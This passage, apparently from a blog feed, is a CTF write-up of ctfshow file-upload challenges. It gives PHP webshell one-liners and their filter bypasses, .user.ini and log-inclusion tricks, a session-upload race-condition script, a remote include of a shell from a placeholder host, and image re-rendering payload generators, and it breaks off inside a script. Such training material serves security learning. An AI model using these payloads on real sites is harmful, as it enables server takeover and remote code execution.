    <category term="ctfshow sql注入 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-sql%E6%B3%A8%E5%85%A5-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow 文件上传 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/8b3f0eaf.html"/>
    <id>https://ke1nys.github.io/posts/8b3f0eaf.html</id>
    <published>2022-12-24T12:04:00.000Z</published>
    <updated>2022-12-29T11:12:58.944Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传检测有三个</p><ol><li><strong>文件名</strong></li><li><strong>文件类型</strong></li><li><strong>文件内容</strong></li></ol><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204215335.png" alt="image-20221224204215335"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224203050054.png" alt="image-20221224203050054"></p><p>windows下合成图片码方法。</p><p>然后传图片码</p><p>进行抓包</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204251719.png" alt="image-20221224204251719"></p><p>抓包后修改后缀为php，然后访问。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204343141.png" alt="image-20221224204343141"></p><p>出现这种情况就是成功了，然后用蚁剑连接</p><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204852845.png" alt="image-20221224204852845"></p><p>直接把这里的png限制给改成php，那么就可以直接上传一句话木马了，然后进行rce了。</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205346493.png" alt="image-20221224205346493"></p><p>还是一样的格式，</p><p>那么还是上传图片码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图片码就是一句话木马&lt;?php eval($_POST[1]);?&gt;  加上任意一张图片组成的图片码。</span><br></pre></td></tr></table></figure><p>上传成功后进行修改后缀。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205601789.png" alt="image-20221224205601789"></p><p>然后就去访问url/upload/normal_upload.php  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205644437.png" alt="image-20221224205644437"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205655846.png" alt="image-20221224205655846"></p><p>然后就可以拿到flag了。</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224213230135.png" alt="image-20221224213230135"></p><p>这道题居然这么快就用到<code>.user.ini</code>,我以为还要到后面的题。</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128165642">https://blog.csdn.net/qq_63548648/article/details/128165642</a>   这是我对 .htacess和.user.ini用法的总结。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里虽然改文件后缀可以绕过，但是网站无法进行解析，蚁剑也不能连接。所以就得去用.user.ini了</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224231943017.png" alt="image-20221224231943017"></p><p>先上传一张图片，然后通过改图片名和内容，上传.user.ini</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232145899.png" alt="image-20221224232145899"></p><p>这里上传的<code>auto_append_file</code>后面跟着的文件名要和后面上传的文件名一样</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232300737.png" alt="image-20221224232300737"></p><p>成功上传，然后去访问/upload/就行</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232348250.png" alt="image-20221224232348250"></p><p>出现这种情况就代表成功了，然后进行蚁剑连接就能拿到flag了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232529978.png" alt="image-20221224232529978"></p><h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233441983.png" alt="image-20221224233441983"></p><p>这道题和上一题解法一样，只不过这道题是把php给过滤掉了，但是我们可以利用短标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;   ---&gt;  &lt;?= eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233918091.png" alt="image-20221224233918091"></p><p>解法和web154一样，就不多写了</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003016143.png" alt="image-20221225003016143"></p><p>和上一题解法一样，只不过这里过滤了[],那么可以把代码改成{}</p><p>还有不一样的是   上传的图片里不能带内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003245068.png" alt="image-20221225003245068"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里和前两题的差别是这里的&lt;?php eval($_POST[1]);?&gt;不能用了，因为就是&#123;&#125;[]都被过滤了，那么我们就可以换另一种写法</span><br><span class="line">&lt;?= eval($_POST[1])?&gt;  ---&gt;  php中不带;也是可以正常执行代码的</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004524802.png" alt="image-20221225004524802"></p><p>这里就是和上一题不同的地方。   </p><p>然后其他都一样。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004647307.png" alt="image-20221225004647307"></p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004739667.png" alt="image-20221225004739667"></p><p>和上一题解法一样，就不多说了。</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225005311958.png" alt="image-20221225005311958"></p><p>这道题可以使用文件的日志包含。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;/var/lo&#x27;.&#x27;g/nginx/access/lo&#x27;.&#x27;g&#x27;  因为log被过滤了，那么只能用这种方法了</span><br></pre></td></tr></table></figure><p><strong>第一步</strong></p><p>就是先上传.user.ini以后，然后进行日志包含</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132701372.png" alt="image-20221225132701372"></p><p><strong>第二步</strong></p><p>传一句话木马</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132752973.png" alt="image-20221225132752973"></p><p><strong>第三步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132810021.png" alt="image-20221225132810021"></p><p>进行rce。</p><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133639357.png" alt="image-20221225133639357"></p><p>这题和上一题的解法一样，只不过这题把空格给过滤了，那么可以用%0d来替代，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include1&#x27;/var/lo&#x27;.&#x27;g/nginx/access.lo&#x27;.&#x27;g&#x27;?&gt;   然后转到Hex这里找的1所在的位置，然后把1的16进制处改成0d就可</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133949942.png" alt="image-20221225133949942"></p><p>在空格被过滤的时候   可以用<strong>0a 0b 0c 0d</strong>来替代</p><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151417817.png" alt="image-20221225151417817"></p><p>还是一样的东西，这不过这里过滤了好多，试了下，就是把png头给过滤掉了。</p><p>这里用GIF图片头可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151910771.png" alt="image-20221225151910771"></p><p>那么接下来就可以用.user.ini了。</p><p>上传.user.ini的时候也要加上GIF89a头</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225152324031.png" alt="image-20221225152324031"></p><p>然后就去和前面一样进行日志包含了。</p><p>然后进行rce就行了。</p><h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225153759215.png" alt="image-20221225153759215"></p><p>这里经过测试不能用        <strong>.</strong></p><p>那么我们就可以用远程文件包含或者session条件竞争或者利用ascii构造代码(就是利用异或    或    非   与  等来构造)</p><p><strong>解法一</strong></p><p>条件竞争   </p><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187</a></p><p>yu师傅写的，可以来参考，我就不写了</p><p><strong>条件竞争代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p>可以利用vps来写，但是这里我不懂搭，而且群主的视频里那个vps打不开了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://your-shell.com/1</span><br><span class="line">http://731540450/1</span><br></pre></td></tr></table></figure><p><img src="file:///C:\Users\sdbdb\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&#x27;http://xxxxx/&#x27;?&gt;  ---&gt;这个网址里是一句话木马  &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>然后直接访问url/upload进行rce就能拿到flag了。</p><h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163327014.png" alt="image-20221225163327014"></p><p>这里就有两种解法，一种是条件竞争，一种就是利用vps</p><p>因为手头上没有vps那么这道题就空着了.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163510878.png" alt="image-20221225163510878"></p><p>如果有的话，直接直接上传，然后访问/upload就行了，</p><h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225170512492.png" alt="image-20221225170512492"></p><p>这道题的考点是png图片的二次渲染，就是得在图片里包含我们的php代码，这里图片得用代码来渲染，直接图片和代码合成起来的图片码不行。</p><p>渲染代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;3.png&#x27;</span>); <span class="comment">#保存在本地的图片马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在phpstudy的www里保存这段代码，并且把一张图片也保存下来，并且命名为自己想要命名的名字。</p><p>如何就去上传这个渲染后的图片码，并且进行抓包查看就行了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195009472.png" alt="image-20221225195009472"></p><p>成功写入代码并且执行了，然后进行rce就行了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195105069.png" alt="image-20221225195105069"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题是考察png图片的二次渲染，合成的图片码这里行不通。</span><br></pre></td></tr></table></figure><h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225202653862.png" alt="image-20221225202653862"></p><p>这里就是利用的jpg二次渲染，但是这道题好像有点问题，好像得找到特殊的图片才能成功，所以这里教方法就行了。</p><p><strong>jpg渲染代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php echo 123;eval($_POST[0]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span 